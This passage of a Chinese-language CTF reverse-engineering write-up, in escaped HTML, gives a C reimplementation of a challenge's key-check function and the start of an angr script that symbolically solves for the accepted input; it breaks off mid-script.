&lt;h3 id=&#34;编写key计算代码&#34;&gt;&lt;a href=&#34;#编写key计算代码&#34; class=&#34;headerlink&#34; title=&#34;编写key计算代码&#34;&gt;&lt;/a&gt;编写key计算代码&lt;/h3&gt;&lt;p&gt;​		需要替换y值&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; dword_202020[&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;] = &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x24DD20CF&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x3E4F0354&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x18B2E85F&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x2F2CAFB8&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x5810ADCB&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x42F7FF85&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x36E0D6C2&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x5F3EF93F&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7F46E74A&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x44DDC864&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x64959795&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x39413451&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x5DC36C45&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x62037E7E&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x5AEA541F&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0x153F8FAC&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;calc&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; key)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = ~key;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= (((key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ key) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = ~key;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= (((key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ key) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key += &lt;span class=&#34;number&#34;&gt;1256252113&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key += &lt;span class=&#34;number&#34;&gt;636006435&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key += &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= (((key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ key) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = ~key;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key += &lt;span class=&#34;number&#34;&gt;1908961232&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= (((key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ key) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key += &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;14&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= (((key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ key) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key += &lt;span class=&#34;number&#34;&gt;3791846473&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = ~key;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= (((key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ key) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = ~key;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= (((key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ key) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= (((key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ key) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key += &lt;span class=&#34;number&#34;&gt;3767795326&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key += &lt;span class=&#34;number&#34;&gt;371756133&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = ~key;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= dword_202020[&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key ^= (((key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ key) &amp;gt;&amp;gt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) ^ (key &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = key - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) - (key &amp;amp; &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;) + &lt;span class=&#34;number&#34;&gt;7&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; key;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt;)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; y = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;scanf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;%u&amp;quot;&lt;/span&gt;, &amp;amp;x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;y = calc(x);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (y == &lt;span class=&#34;number&#34;&gt;730447668&lt;/span&gt;) &amp;#123; &lt;span class=&#34;comment&#34;&gt;//**比赛实际服务器返回的number**）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;right\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;wrong\n&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		gcc -o f fk.c 得到f二进制文件&lt;/p&gt;
&lt;h3 id=&#34;angr脚本-得到随机值&#34;&gt;&lt;a href=&#34;#angr脚本-得到随机值&#34; class=&#34;headerlink&#34; title=&#34;angr脚本,得到随机值&#34;&gt;&lt;/a&gt;angr脚本,得到随机值&lt;/h3&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; angr&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; claripy&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; sys&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; solving :&amp;quot;&lt;/span&gt;, sys.argv[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    p = angr.Project(sys.argv[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;], load_options=&amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;auto_load_libs&amp;quot;&lt;/span&gt;: &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    state = p.factory.entry_state()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sm = p.factory.simgr(state)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;good&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;state&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        stdout_output = state.posix.dumps(sys.stdout.fileno())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;right&amp;#x27;&lt;/span&gt;.encode() &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; stdout_output  &lt;span class=&#34;comment&#34;&gt;# :boolean&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;bad&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;state&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        stdout_output = state.posix.dumps(sys.stdout.fileno())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;wrong&amp;#x27;&lt;/span&gt;.encode() &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; stdout_output&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sm.explore(find=good, avoid=bad)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; sm.found:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;# print(sm.found[0].solver.eval(flag, cast_to=bytes)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;# print(sm.found[0].posix.dumps(sys.stdout.fileno())&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(sm.found[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;].posix.dumps(sys.stdin.fileno()))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Not found&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;Done&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;string&#34;&gt;&amp;#x27;__main__&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    